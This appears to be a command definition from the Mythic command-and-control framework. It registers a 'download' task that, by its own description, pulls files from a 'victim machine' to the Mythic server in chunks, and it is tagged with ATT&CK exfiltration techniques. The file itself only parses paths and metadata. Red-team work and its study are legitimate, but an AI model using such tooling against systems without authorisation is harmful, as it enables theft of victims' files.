from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file", 
                type=ParameterType.String, 
                description="File to download.",
                parameter_group_info=[ParameterGroupInfo(
                    required=True
                )]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require a path to download.\n\tUsage: {}".format(DownloadCommand.help_cmd))
        filename = ""
        if self.command_line[0] == '"' and self.command_line[-1] == '"':
            self.command_line = self.command_line[1:-1]
            filename = self.command_line
        elif self.command_line[0] == "'" and self.command_line[-1] == "'":
            self.command_line = self.command_line[1:-1]
            filename = self.command_line
        elif self.command_line[0] == "{":
            temp_json = json.loads(self.command_line)
            # if "host" in temp_json:
            #     # this means we have tasking from the file browser rather than the popup UI
            #     # the medusa agent doesn't currently have the ability to do _remote_ listings, so we ignore it
            # filename = temp_json["path"] + "/" + temp_json["file"]
            filename = temp_json["file"]
            # else:
            #     raise Exception("Unsupported JSON")
        else:
            filename = self.command_line

        if filename != "":
            self.args[0].value = filename
        

class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download {path to remote file}"
    description = "Download a file from the victim machine to the Mythic server in chunks (no need for quotes in the path)."
    version = 1
    supported_ui_features = ["file_browser:download"]
    is_download_file = True
    author = "@ajpc500"
    parameters = []
    attackmapping = ["T1020", "T1030", "T1041"]
    argument_class = DownloadArguments
    browser_script = [
        BrowserScript(script_name="download", author="@its_a_feature_"),
        BrowserScript(script_name="download_new", author="@its_a_feature_", for_new_ui=True)
    ]    
    attributes = CommandAttributes(
        supported_python_versions=["Python 2.7", "Python 3.8"],
        supported_os=[SupportedOS.MacOS, SupportedOS.Windows, SupportedOS.Linux ],
    )


    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
